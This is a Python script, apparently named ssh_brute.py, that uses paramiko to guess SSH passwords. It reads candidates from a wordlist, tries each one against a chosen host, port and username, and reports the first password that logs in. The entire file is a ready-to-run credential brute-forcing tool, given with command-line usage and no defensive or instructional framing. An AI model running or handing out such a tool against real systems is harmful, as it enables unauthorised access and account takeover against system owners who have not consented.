import paramiko
import sys
import time

# Attempt a single SSH connection. Returns True if auth succeeds, False otherwise.

def ssh_connect(ip, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=username, password=password, timeout=3)
        
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        return False
    finally:
    	client.close()
        
# Read passwords from wordlist and try each one via ssh_connect.
# Stops on first successful authentication.

def brute_force(ip, port, username, wordlist):
    

    try:
        with open(wordlist, "r") as file:
            for line in file:
                word = line.strip()
                time.sleep(5)

                if not word:
                    continue

                if ssh_connect(ip, port, username, word):
                    print(f"[+] Found: {word}")
                    return

        print("[-] No match found in wordlist.")

    except FileNotFoundError:
        print("[-] File not found.")

    except Exception as e:
        print(f"[-] Error: {e}")




def main():
    if len(sys.argv) != 5:
        print("Usage: python3 ssh_brute.py <ip> <port> <username> <wordlist>")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    wordlist = sys.argv[4]
    brute_force(ip, port, username, wordlist)

if __name__ == "__main__":
    main()        